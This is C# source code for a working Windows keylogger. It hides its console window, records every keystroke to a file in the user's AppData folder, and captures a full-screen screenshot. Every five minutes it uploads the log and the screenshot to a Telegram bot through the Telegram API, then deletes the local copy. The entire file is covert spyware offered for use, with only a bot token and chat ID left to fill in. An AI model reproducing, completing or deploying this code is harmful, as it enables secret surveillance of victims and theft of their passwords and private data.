using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

class Keylogger
{
    private static readonly string botToken = "Yourtoken";
    private static readonly long chatId = 1234567890;
    private static readonly string apiUrl = $"https://api.telegram.org/bot{botToken}/sendDocument";
    private static string area = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string filenme = "save.txt";

    



    private static string areacomb = Path.Combine(area,filenme);
   
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    const int VK_SPACE = 0x20;
    const int VK_RETURN = 0x0D;
    const int VK_SHIFT = 0x10;
    const int VK_BACK = 0x08;
    const int VK_RBUTTON = 0x02;
    const int VK_CAPITAL = 0x14;
    const int VK_TAB = 0x09;
    const int VK_UP = 0x26;
    const int VK_DOWN = 0x28;
    const int VK_LEFT = 0x25;
    const int VK_RIGHT = 0x27;
    const int VK_CONTROL = 0x11;
    const int VK_MENU = 0x12;
private static void Log(string input)
    {
        try
        {
            using (StreamWriter logFile = new StreamWriter(areacomb, true))
            {
                logFile.Write(input);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error logging: " + ex.Message);
        }
    }

    private static bool SpecialKeys(int key)
    {
        switch (key)
        {
            case VK_SPACE:
                Console.Write(" ");
                Log(" ");
                return true;
            case VK_RETURN:
                Console.Write("\n");
                Log("\n");
                return true;
            case '¾':
                Console.Write(".");
                Log(".");
                return true;
            case VK_SHIFT:
                Console.Write("#SHIFT#");
                Log("#SHIFT#");
                return true;
            case VK_BACK:
                Console.Write("\b");
                Log("\b");
                return true;
            case VK_RBUTTON:
                Console.Write("#R_CLICK#");
                Log("#R_CLICK#");
                return true;
            case VK_CAPITAL:
                Console.Write("#CAPS_LOCK#");
                Log("#CAPS_LOCK");
                return true;
            case VK_TAB:
                Console.Write("#TAB");
                Log("#TAB");
                return true;
            case VK_UP:
                Console.Write("#UP");
                Log("#UP_ARROW_KEY");
                return true;
            case VK_DOWN:
                Console.Write("#DOWN");
                Log("#DOWN_ARROW_KEY");
                return true;
            case VK_LEFT:
                Console.Write("#LEFT");
                Log("#LEFT_ARROW_KEY");
                return true;
            case VK_RIGHT:
                Console.Write("#RIGHT");
                Log("#RIGHT_ARROW_KEY");
                return true;
            case VK_CONTROL:
                Console.Write("#CONTROL");
                Log("#CONTROL");
                return true;
            case VK_MENU:
                Console.Write("#ALT");
                Log("#ALT");
                return true;
            default:
                return false;
        }
    }

    static async Task Main(string[] args)
    {
        IntPtr hwnd = GetConsoleWindow();
        ShowWindow(hwnd, 0);
        takess();
        
        while (true)
        {
            Thread.Sleep(10);
            for (int key = 8; key <= 190; key++)
            {
                if ((GetAsyncKeyState(key) & 0x8000) != 0) // Check if key is pressed
                {
                    if (!SpecialKeys(key))
                    {
                        char keyChar = (char)key;
                        Log(keyChar.ToString());
                    }
                }
            }
            try
            {
                
                string flpth = areacomb;

              
                await SendFileAsync(flpth);
                File.Delete(flpth);
               
                Console.WriteLine("Waiting for 5 minutes...");
                await Task.Delay(TimeSpan.FromMinutes(5));  // Wait for 5 minutes / you customize if you want 
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

        }


        
    }
    private static async Task SendFileAsync(string filePath)
    {
        try
        {
            if (File.Exists(filePath))
            {
                using (HttpClient client = new HttpClient())
                {
                    var form = new MultipartFormDataContent();

                   
                    form.Add(new StringContent(chatId.ToString()), "chat_id");

                    
                    var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                    fileContent.Headers.Add("Content-Type", "application/octet-stream");
                    form.Add(fileContent, "document", "dat.txt");
  HttpResponseMessage response = await client.PostAsync(apiUrl, form);

                   
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("File sent successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Failed to send the file.");
                    }
                }
            }
            else
            {
                Console.WriteLine("File not found: " + filePath);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending file: " + ex.Message);
        }

    }
    //  private static string area = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static async void takess()
    {
        Rectangle bounds = Screen.GetBounds(Point.Empty);

        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
        {
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            
            string filePath = Path.Combine(area, "test.jpg");

         
            bitmap.Save(filePath, ImageFormat.Jpeg);
            if (File.Exists(filePath)) 
            {
                await SendFileAsync(filePath);
            }

            Console.WriteLine($"Screenshot saved at: {filePath}");
        }
    }
}
